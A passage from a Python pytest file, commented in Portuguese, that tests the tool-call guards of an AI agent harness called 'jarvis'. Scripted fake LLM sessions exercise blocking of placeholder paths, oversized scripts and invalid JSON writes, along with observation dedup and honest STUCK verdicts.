        {"role": "tool", "tool_call_id": "c1", "content": "ok: write_file h.py"},
        {"role": "assistant", "content": "done"},
    ]
    note = _placeholder_script_note(msgs)
    assert note is not None
    assert "placeholder_script:h.py" in note
    assert "json.dump" in note
    assert "grep -c" not in note


def test_real_py_not_flagged(tmp_path, monkeypatch) -> None:
    """.py com lógica real (loop + json.dump, sem placeholder) passa."""
    from jarvis.core.agent import _placeholder_script_note
    monkeypatch.chdir(tmp_path)
    content = ("import json\nfor line in open('f.log'):\n"
               "    print(line)\njson.dump({'a': 1}, open('o.json', 'w'))\n")
    msgs = [
        {"role": "assistant", "tool_calls": [{
            "id": "c1", "type": "function",
            "function": {"name": "write_file",
                         "arguments": jsonlib.dumps({
                             "path": "h.py", "content": content})}}]},
        {"role": "tool", "tool_call_id": "c1", "content": "ok: write_file h.py"},
        {"role": "assistant", "content": "done"},
    ]
    assert _placeholder_script_note(msgs) is None


def test_move_forward_blocks_polish_before_coverage(tmp_path, monkeypatch) -> None:
    """Re-editar .sh com exit 0 e deliverable ausente = BLOCKED
    (formigueiro: L8v41 queimou 11 turns na parte 1); libera após todos
    existirem."""
    class AllocSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                tc = ("write_file", {"path": "a.sh",
                                     "content": "echo ran-a\n"})
            elif self.calls == 2:
                tc = ("execute_shell", {"cmd": "bash a.sh"})
            elif self.calls == 3:
                tc = ("str_replace", {"path": "a.sh", "old": "ran-a",
                                      "new": "exit 1"})
            elif self.calls == 4:
                tc = ("write_file", {"path": "b.sh",
                                     "content": "echo ran-b\n"})
            elif self.calls == 5:
                tc = ("str_replace", {"path": "a.sh", "old": "ran-a",
                                      "new": "# polished"})
            else:
                return FakeResponse({"choices": [{"message": {
                    "role": "assistant", "content": "stopped"}}]})
            name, args = tc
            msg = {
                "role": "assistant",
                "content": "",
                "tool_calls": [{
                    "id": f"call-{self.calls}",
                    "type": "function",
                    "function": {
                        "name": name,
                        "arguments": jsonlib.dumps(args),
                    },
                }],
            }
            return FakeResponse({"choices": [{"message": msg}]})

    # exec resulta exit 0: FakeSession envolve; dispatch executa de verdade
    # (a.sh real no tmp). Para o resultado conter [exit: 0] o script deve
    # sair 0 — `exit 0` garante.
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=AllocSession(), approve=True)
    result = agent.run("create a.sh and b.sh helpers")
    assert any("already runs successfully" in str(m.get("content", ""))
               for m in getattr(result, "messages", []))
    assert (tmp_path / "b.sh").exists()
    assert "# polished" in (tmp_path / "a.sh").read_text()


def test_list_directory_offered_and_dispatched(tmp_path, monkeypatch) -> None:
    """list_directory existe como tool e despacha (L8: disciplina mandava
    LOCATE-first mas a tool nunca existiu — instrução impossível)."""
    (tmp_path / "logs").mkdir()
    (tmp_path / "logs" / "a.log").write_text("x\n")

    class LsSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-1", "type": "function",
                           "function": {"name": "list_directory",
                               "arguments": jsonlib.dumps(
                                   {"path": str(tmp_path)})}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    agent = Agent(Config(), session=LsSession(), approve=True)
    result = agent.run("list files")
    assert any("logs" in str(m.get("content", "")) for m in
               getattr(result, "messages", []))


def test_prefix_gate_allows_valid_json(tmp_path, monkeypatch) -> None:
    """.json VÁLIDO passa pelo gate intacto (ex.: config escrita à mão)."""
    class ValidSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-1", "type": "function",
                           "function": {"name": "write_file",
                               "arguments": jsonlib.dumps({
                                   "path": str(tmp_path / "cfg.json"),
                                   "content": '{"a": 1}'})}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=ValidSession(), approve=True)
    agent.run("write config")
    assert (tmp_path / "cfg.json").exists()


def test_write_blocks_absolute_container_path_in_content(tmp_path, monkeypatch) -> None:
    """Conteúdo com `/rules/...` e rules/ existindo no CWD → BLOCKED dirigido
    (L8b1 20/09: passou no gate de sintaxe, falhou só no run)."""
    (tmp_path / "rules").mkdir()

    class PoisonSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-1", "type": "function",
                           "function": {"name": "write_file",
                               "arguments": jsonlib.dumps({
                                   "path": "det.sh",
                                   "content": "#!/bin/sh\nRULES=/rules/detection_rules.json\n"})}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=PoisonSession(), approve=True)
    result = agent.run("write detector")
    assert not (tmp_path / "det.sh").exists()
    assert any("absolute container path" in str(m.get("content", ""))
               for m in getattr(result, "messages", []))


def test_poison_gate_skips_existing_absolute_path(tmp_path, monkeypatch) -> None:
    """Absoluto que EXISTE (ex.: CWD absoluto /tmp/l8bX/logs/x) é legítimo —
    o gate não dispara (L8b5 20/09: falso-positivo matou o run)."""
    (tmp_path / "logs").mkdir()
    (tmp_path / "logs" / "a.log").write_text("x\n")
    absref = str(tmp_path / "logs" / "a.log")

    class AbsSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-1", "type": "function",
                           "function": {"name": "write_file",
                               "arguments": jsonlib.dumps({
                                   "path": "det.sh",
                                   "content": "#!/bin/sh\nF=" + absref + "\n"})}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=AbsSession(), approve=True)
    result = agent.run("write detector")
    assert (tmp_path / "det.sh").exists()
    assert not any("absolute container path" in str(m.get("content", ""))
                   for m in getattr(result, "messages", []))


def test_bar_repeat_orders_strategy_switch(tmp_path, monkeypatch) -> None:
    """Mesmo .sh barrado 2x por sintaxe → ordem de TROCA DE ESTRATÉGIA
    (L8b1 20/09: 3x mesmo intrusion_detector.sh; linha+molde não moveram)."""
    bad = "#!/bin/sh\nif true; then\necho unclosed\n"

    class RepeatSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls <= 2:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": f"call-{self.calls}",
                           "type": "function",
                           "function": {"name": "write_file",
                               "arguments": jsonlib.dumps({
                                   "path": "det.sh", "content": bad})}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=RepeatSession(), approve=True)
    result = agent.run("write detector")
    assert any("TROQUE DE ESTRAT" in str(m.get("content", ""))
               for m in getattr(result, "messages", []))


def test_placeholder_literal_blocked_in_exec_and_read(tmp_path, monkeypatch) -> None:
    """Token ALL-CAPS (<IP>) em cmd e em path de read → ERROR dirigido
    (L8b1 20/09: `response.py "$1"`, read de `incident_<IP>_...`)."""
    class PhSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-1", "type": "function",
                           "function": {"name": "execute_shell",
                               "arguments": jsonlib.dumps({
                                   "cmd": "python3 response.py <IP>"})}}]}
            elif self.calls == 2:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-2", "type": "function",
                           "function": {"name": "read_file",
                               "arguments": jsonlib.dumps({
                                   "path": "incident_<IP>_x.txt"})}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    agent = Agent(Config(), session=PhSession(), approve=True)
    result = agent.run("respond")
    hits = [str(m.get("content", ""))
            for m in getattr(result, "messages", [])]
    assert sum("Literal placeholder <IP>" in h for h in hits) == 2


def test_write_placeholder_path_blocked(tmp_path, monkeypatch) -> None:
    """write_file com <TOKEN> no path → BLOCKED dirigido (h1 20/09:
    `incident_<IP>_<timestamp>.txt` criado literal; read/exec guards não
    cobriam write)."""
    class WpSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-1", "type": "function",
                           "function": {"name": "write_file",
                               "arguments": jsonlib.dumps({
                                   "path": "incident_<IP>_x.txt",
                                   "content": "data"})}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=WpSession(), approve=True)
    result = agent.run("write incident")
    assert not (tmp_path / "incident_<IP>_x.txt").exists()
    assert any("literal placeholder <IP>" in str(m.get("content", ""))
               for m in getattr(result, "messages", []))


def _read_two_session(reads):
    """FakeSession que emite N reads e para (stopped)."""
    class RSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls <= len(reads):
                name, args = reads[self.calls - 1]
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": f"call-{self.calls}",
                           "type": "function",
                           "function": {"name": name,
                               "arguments": jsonlib.dumps(args)}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})
    return RSession()


def test_obs_dedup_repeated_read(tmp_path, monkeypatch) -> None:
    """Mesmo read 2x sem write → 2ª vira ponteiro (msgs 51% do payload;
    n-batch relia os mesmos logs 3x)."""
    (tmp_path / "a.log").write_text("hello log\n")
    monkeypatch.chdir(tmp_path)
    agent = Agent(Config(), session=_read_two_session([
        ("read_file", {"path": "a.log"}),
        ("read_file", {"path": "a.log"})]), approve=True)
    result = agent.run("read twice")
    hits = [str(m.get("content", ""))
            for m in getattr(result, "messages", [])]
    assert sum("hello log" in h for h in hits) == 1
    assert any("repeated observation" in h for h in hits)


def test_obs_dedup_write_invalidates(tmp_path, monkeypatch) -> None:
    """Write no path invalida o cache: re-read traz conteúdo real
    (ciclo write→read→verify nunca serve velho)."""
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)

    class WSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            calls = {
                1: ("write_file", {"path": "b.txt", "content": "v1\n"}),
                2: ("read_file", {"path": "b.txt"}),
                3: ("write_file", {"path": "b.txt", "content": "v2\n"}),
                4: ("read_file", {"path": "b.txt"}),
            }
            if self.calls in calls:
                name, args = calls[self.calls]
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": f"call-{self.calls}",
                           "type": "function",
                           "function": {"name": name,
                               "arguments": jsonlib.dumps(args)}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    agent = Agent(Config(), session=WSession(), approve=True)
    result = agent.run("write read write read")
    hits = [str(m.get("content", ""))
            for m in getattr(result, "messages", [])]
    assert not any("repeated observation" in h for h in hits)
    assert sum("v2" in h for h in hits) >= 1


def test_obs_dedup_list_and_write(tmp_path, monkeypatch) -> None:
    """List repetido vira ponteiro; write (qualquer path) invalida lists
    (arquivo novo pode aparecer)."""
    (tmp_path / "a.txt").write_text("x\n")
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)

    class LSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            calls = {
                1: ("list_directory", {"path": "."}),
                2: ("list_directory", {"path": "."}),
                3: ("write_file", {"path": "b.txt", "content": "y\n"}),
                4: ("list_directory", {"path": "."}),
            }
            if self.calls in calls:
                name, args = calls[self.calls]
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": f"call-{self.calls}",
                           "type": "function",
                           "function": {"name": name,
                               "arguments": jsonlib.dumps(args)}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    agent = Agent(Config(), session=LSession(), approve=True)
    result = agent.run("list list write list")
    hits = [str(m.get("content", ""))
            for m in getattr(result, "messages", [])]
    assert sum("repeated observation" in h for h in hits) == 1


def test_strict_default_by_tier(monkeypatch) -> None:
    """strict_tools=None → tier speed/fast True, resto False (H-strict
    20/09: tiers locais ganham constrained; reasoning/cloud preservam)."""
    from jarvis.core import agent as _ag
    from jarvis.core import model_registry as _mr

    class FakeEntry:
        def __init__(self, tier):
            self.tier = tier
            self.raw = {}

    class FakeReg:
        default = "bonsai"
        _t = {"bonsai": "speed", "jarvis-fast": "fast",
              "jarvis-strong": "reasoning"}

        @classmethod
        def load(cls, path=None):
            return cls()

        def get(self, mid):
            return FakeEntry(self._t[mid]) if mid in self._t else None

    monkeypatch.setattr(_mr, "ModelRegistry", FakeReg)
    monkeypatch.setenv("JARVIS_LLM_MODEL", "default")
    assert _ag._strict_default("") is True
    assert _ag._strict_default("default") is True
    assert _ag._strict_default("jarvis-fast") is True
    assert _ag._strict_default("jarvis-strong") is False
    assert _ag._strict_default("nope") is False
    assert Agent(Config(), session=FakeSession()).strict_tools is True
    assert Agent(Config(), session=FakeSession(),
                 strict_tools=False).strict_tools is False


def test_synth_offered_only_after_bar() -> None:
    """synthesize_command no schema só pós-bar (L8g1: visível desde o turno
    1 virou distração — 3/4 turns em grammar inexistente)."""
    from jarvis.core.agent import _synth_offered
    assert _synth_offered({}, {}, False) is False
    assert _synth_offered({"p": "h"}, {}, False) is True
    assert _synth_offered({}, {"a.json": 2}, False) is True
    assert _synth_offered({}, {}, True) is True


def test_truncate_history_for_send() -> None:
    """Sliding window: tool-results antigas truncam, últimas intactas,
    histórico original nunca muta (donkey §20)."""
    from jarvis.core.agent import _truncate_history_for_send
    big1 = "x" * 15000
    big2 = "y" * 8000
    fresh = "z" * 8000
    msgs = [{"role": "system", "content": "sys"},
            {"role": "assistant", "content": "a1"},
            {"role": "tool", "content": big1},
            {"role": "assistant", "content": "a2"},
            {"role": "tool", "content": big2},
            {"role": "assistant", "content": "a3"},
            {"role": "tool", "content": fresh}]
    out = _truncate_history_for_send(msgs)
    roles = [m.get("role") for m in out]
    assert roles == [m.get("role") for m in msgs]
    assert out[-1]["content"] == fresh
    assert out[4]["content"] == big2
    assert "truncated" in out[2]["content"]
    assert len(out[2]["content"]) < 1000
    assert msgs[2]["content"] == big1
    small = [{"role": "system", "content": "s"},
             {"role": "tool", "content": "tiny"}]
    assert _truncate_history_for_send(small)[1]["content"] == "tiny"


def test_synthesize_command_dispatch(tmp_path, monkeypatch) -> None:
    """synthesize_command faz sub-call mascarada e devolve o comando
    (H-grammar: gera sob GBNF, nunca executa — sem aprovação)."""
    class SynthSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-1", "type": "function",
                           "function": {"name": "synthesize_command",
                               "arguments": jsonlib.dumps({
                                   "desc": "make f.sh executable",
                                   "grammar": "chmod"})}}]}
            elif self.calls == 2:
                msg = {"role": "assistant",
                       "content": "chmod +x f.sh"}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    agent = Agent(Config(), session=SynthSession(), approve=True)
    result = agent.run("make executable")
    assert any("chmod +x f.sh" in str(m.get("content", ""))
               for m in getattr(result, "messages", []))
    assert any("synthesize_command" in c for c in result.commands_run)


def test_synthesize_unknown_grammar(tmp_path, monkeypatch) -> None:
    """Gramática inexistente → ERROR dirigido (sem sub-call, sem crash)."""
    class BadGSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-1", "type": "function",
                           "function": {"name": "synthesize_command",
                               "arguments": jsonlib.dumps({
                                   "desc": "x", "grammar": "awk"})}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    agent = Agent(Config(), session=BadGSession(), approve=True)
    result = agent.run("synthesize")
    assert any("unknown grammar" in str(m.get("content", ""))
               for m in getattr(result, "messages", []))


def test_synthesize_script_intent_redirects_to_write(tmp_path, monkeypatch) -> None:
    """grammar='write' p/ script → redireciona a write_file (g2 20/09:
    modelo quer sintetizar script, máscara só cobre comandos)."""
    class WriteGSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-1", "type": "function",
                           "function": {"name": "synthesize_command",
                               "arguments": jsonlib.dumps({
                                   "desc": "write detector script",
                                   "grammar": "write"})}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    agent = Agent(Config(), session=WriteGSession(), approve=True)
    result = agent.run("synthesize")
    assert any("masks cover SINGLE commands only" in str(m.get("content", ""))
               for m in getattr(result, "messages", []))


def test_echo_ban_engages_after_second_invalid_artifact(tmp_path, monkeypatch) -> None:
    """2º artifact inválido engata ban vinculante de echo-em-JSON (escalada
    soft→binding, L10 retry: v27/b3/w2 repetiram a representação até STUCK).
    jq passa intacto."""
    class EscSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                cmd = "python3 -c \"open('a.json','w').write('{bad')\""
            elif self.calls == 2:
                cmd = "ls"
            elif self.calls == 3:
                cmd = "echo '{\"k\":1}' > b.json"
            elif self.calls == 4:
                cmd = "jq -n '{k:1}'"
            else:
                return FakeResponse({"choices": [
                    {"message": {"role": "assistant",
                                 "content": "stopped"}}]})
            msg = {"role": "assistant", "content": "",
                   "tool_calls": [{"id": f"call-{self.calls}",
                       "type": "function",
                       "function": {"name": "execute_shell",
                           "arguments": jsonlib.dumps({"cmd": cmd})}}]}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=EscSession(), approve=True)
    result = agent.run("produce json")
    hits = [str(m.get("content", ""))
            for m in getattr(result, "messages", [])]
    assert any("echo-to-JSON banned" in h for h in hits)
    assert not (tmp_path / "b.json").exists()
    # call-4 (jq real) só asserta onde o binário existe: sandbox Nix não
    # tem jq (rebuild 20/09) — o mecanismo (ban) já está provado acima;
    # echo_to_json("jq...")==False é coberto em test_echo_to_json.
    if __import__("shutil").which("jq") is not None:
        assert any('"k"' in h for h in hits)


def test_llm_empty_choices_stuck_honest(monkeypatch) -> None:
    """Provider sem choices (EXP-G 20/09: 1 run real morreu com IndexError
    cru em choices[0]) → STUCK honesto com motivo, nunca exceção."""

    class EmptySession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            return FakeResponse({"choices": []})

    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=EmptySession(), approve=True)
    result = agent.run("qualquer coisa")
    assert result.verdict == "STUCK"
    assert "no choices" in result.final_response


def test_lessons_outage_logged_not_silent(monkeypatch) -> None:
    """Qdrant down no inject de lessons (EXP-J 20/09: "" idêntico a miss)
    → evento lessons_unavailable emitido; run segue sem lessons."""
    from jarvis.core import logging as _log

    class DeadMemory:
        def lessons(self, query, top_k=3):
            raise ConnectionError("qdrant down")

    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    seen: list[tuple[str, dict]] = []
    _orig_emit = _log.Logger.emit

    def _rec(self, event: str, *, level: str = "info",
             detail: object = None, **kw) -> None:
        seen.append((event, dict(detail) if detail else {}))
        try:
            _orig_emit(self, event, level=level, detail=detail, **kw)
        except Exception:
            pass

    monkeypatch.setattr(_log.Logger, "emit", _rec)

    class StopSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            return FakeResponse({"choices": [
                {"message": {"role": "assistant",
                             "content": "nada a fazer"}}]})

    agent = Agent(Config(), session=StopSession(), approve=True,
                  memory=DeadMemory())
    result = agent.run("oi")
    assert result.verdict in ("VERIFIED", "UNVERIFIED", "STUCK", "FAILED")
    assert any(e == "lessons_unavailable" for e, _ in seen)
    assert any("ConnectionError" in str(d) for e, d in seen
               if e == "lessons_unavailable")


def test_deterministic_tool_failure_is_error(tmp_path, monkeypatch) -> None:
    """build_json_dataset c/ schema ausente (L9 real 21/09: {"ok": false}
    virava string sem ERROR → chamada "ok" → VERIFIED vácuo sem artefato).
    Falha determinística vira ERROR observável; veredito NÃO é VERIFIED."""

    class BjSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{
                           "id": "call-1", "type": "function",
                           "function": {
                               "name": "build_json_dataset",
                               "arguments": jsonlib.dumps(
                                   {"schema": "ausente.json",
                                    "out": "out.json"})}}]}
            else:
                msg = {"role": "assistant", "content": "falhou, paro"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=BjSession(), approve=True)
    result = agent.run("transform csv to json")
    assert result.verdict != "VERIFIED"
    assert any(str(m.get("content", "")).startswith("ERROR")
               for m in result.messages if m.get("role") == "tool")


def test_malformed_budget_stops_run(tmp_path, monkeypatch) -> None:
    """Args-JSON inválido 3x seguidas → STUCK honesto na 3ª (L8b3 20/09: até
    8 turns queimados em hint sem teto; verify_turns não cobre esse caso)."""
    class BadSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            msg = {"role": "assistant", "content": "",
                   "tool_calls": [{"id": f"call-{self.calls}",
                       "type": "function",
                       "function": {"name": "write_file",
                           "arguments": "{invalid json,"}}]}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    sess = BadSession()
    agent = Agent(Config(), session=sess, approve=True)
    result = agent.run("write big file")
    assert sess.calls == 3
    assert "3x seguidas" in (result.final_response or "")
    assert result.verdict == "STUCK"


def test_artifact_repeat_orders_strategy(tmp_path, monkeypatch) -> None:
    """Mesmo .json inválido em 2 artifact-checks → ordem de TROCA (L8b3
    20/09: detector válido gerando JSON inválido; 'regenerate' não moveu)."""
    class ArtSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                cmd = "python3 -c \"open('a.json','w').write('{bad')\""
            elif self.calls == 2:
                cmd = "ls"
            else:
                return FakeResponse({"choices": [
                    {"message": {"role": "assistant",
                                 "content": "stopped"}}]})
            msg = {"role": "assistant", "content": "",
                   "tool_calls": [{"id": f"call-{self.calls}",
                       "type": "function",
                       "function": {"name": "execute_shell",
                           "arguments": jsonlib.dumps({"cmd": cmd})}}]}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=ArtSession(), approve=True)
    result = agent.run("produce json")
    assert any("TROQUE DE ESTRATÉGIA" in str(m.get("content", ""))
               for m in getattr(result, "messages", []))


def test_burro_blocks_oversized_script_write(tmp_path, monkeypatch) -> None:
    """write_file .sh >4000 chars → BLOCKED carga excessiva com molde
    (burro 20/09: gigante trunca nos 4096 tokens → malformado → budget)."""
    big = "#!/bin/sh\n" + "echo x\n" * 900
    assert len(big) > 4000

    class HeavySession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-1", "type": "function",
                           "function": {"name": "write_file",
                               "arguments": jsonlib.dumps({
                                   "path": "big.sh", "content": big})}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=HeavySession(), approve=True)
    result = agent.run("write big script")
    assert not (tmp_path / "big.sh").exists()
    assert any("carga excessiva" in str(m.get("content", ""))
               for m in getattr(result, "messages", []))


def test_burro_allows_big_prose_and_small_script(tmp_path, monkeypatch) -> None:
    """Prosa gigante passa intacta; script pequeno passa (burro só barra
    carga de código/dados — sem falso-positivo em ovo bom)."""
    class MixedSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                tc = {"name": "write_file",
                      "arguments": jsonlib.dumps({
                          "path": "notes.md", "content": "lorem ipsum\n" * 500})}
            elif self.calls == 2:
                tc = {"name": "write_file",
                      "arguments": jsonlib.dumps({
                          "path": "tiny.sh",
                          "content": "#!/bin/sh\necho hi\n"})}
            else:
                return FakeResponse({"choices": [
                    {"message": {"role": "assistant",
                                 "content": "stopped"}}]})
            return FakeResponse({"choices": [{"message": {
                "role": "assistant", "content": "",
                "tool_calls": [{"id": f"call-{self.calls}", "type": "function",
                                "function": tc}]}}]})

    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=MixedSession(), approve=True)
    agent.run("write docs and helper")
    assert (tmp_path / "notes.md").exists()
    assert (tmp_path / "tiny.sh").exists()


def test_clobber_sh_via_python_refused(tmp_path, monkeypatch) -> None:
    """`python3 -c open('x.sh','w').write(json...)` → ERROR dirigido (L8b2
    20/09: molde-JSON aplicado no .sh 2x, matando o detector). Leitura
    open('x.sh') sem 'w' passa intacto."""
    class ClobSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-1", "type": "function",
                           "function": {"name": "execute_shell",
                               "arguments": jsonlib.dumps({
                                   "cmd": "python3 -c \"import json; open('d.sh','w').write('x')\""})}}]}
            elif self.calls == 2:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{"id": "call-2", "type": "function",
                           "function": {"name": "execute_shell",
                               "arguments": jsonlib.dumps({
                                   "cmd": "python3 -c \"print(open('d.sh').read())\""})}}]}
            else:
                msg = {"role": "assistant", "content": "stopped"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
    agent = Agent(Config(), session=ClobSession(), approve=True)
    result = agent.run("emit")
    hits = [str(m.get("content", ""))
            for m in getattr(result, "messages", [])]
    assert any("never\nfor scripts" in h or "never for scripts" in h
               for h in hits)
    # segunda call (leitura) não foi barrada pelo guard:
    assert sum("never for scripts" in h for h in hits) == 1


class _CaptureSession(FakeSession):
    """Captura o payload (tools anunciadas) de cada chamada."""

    def __init__(self):
        super().__init__()
        self.payloads = []

    def post(self, url, json=None, timeout=120, **kw):
        self.calls += 1
        assert "chat/completions" in url
        self.payloads.append(json)
        if self.calls == 1:
            msg = {
                "role": "assistant", "content": "",
                "tool_calls": [{
                    "id": "call-1", "type": "function",
                    "function": {"name": "execute_shell",
                                 "arguments": jsonlib.dumps({"cmd": "ls"})}}]}
        else:
            msg = {"role": "assistant", "content": "done"}
        return FakeResponse({"choices": [{"message": msg}]})


def test_tool_class_filters_attractor(monkeypatch) -> None:
    """Contract A: tool_class='action' remove read_file da superfície
    (atractor E6); default (None) mantém o schema atual."""
    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)

    s_default = _CaptureSession()
    Agent(Config(), session=s_default, approve=True, memory=None).run(
        "count lines in a log")
    names_default = {t["function"]["name"]
                     for p in s_default.payloads for t in (p.get("tools") or [])}
    assert "read_file" in names_default

    s_filtered = _CaptureSession()
    Agent(Config(), session=s_filtered, approve=True, memory=None,
          tool_class="action",
          mcp_servers={"nix": "/usr/bin/nix"}).run("count lines in a log")
    names_f = {t["function"]["name"]
               for p in s_filtered.payloads for t in (p.get("tools") or [])}
    assert "read_file" not in names_f
    assert "execute_shell" in names_f


def test_deterministic_tool_crash_becomes_error(tmp_path, monkeypatch) -> None:
    """build_json_dataset sem CSVs (L9 real 21/09: StopIteration cru
    derrubou o run). Tool determinística nunca crasha o loop."""

    class BjCrashSession(FakeSession):
        def post(self, url, json=None, timeout=120, **kw):
            self.calls += 1
            if self.calls == 1:
                msg = {"role": "assistant", "content": "",
                       "tool_calls": [{
                           "id": "call-1", "type": "function",
                           "function": {
                               "name": "build_json_dataset",
                               "arguments": jsonlib.dumps(
                                   {"schema": "s.json",
                                    "out": "o.json"})}}]}
            else:
                msg = {"role": "assistant", "content": "paro"}
            return FakeResponse({"choices": [{"message": msg}]})

    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr("jarvis.core.agent.human_approve", lambda cmd: True)
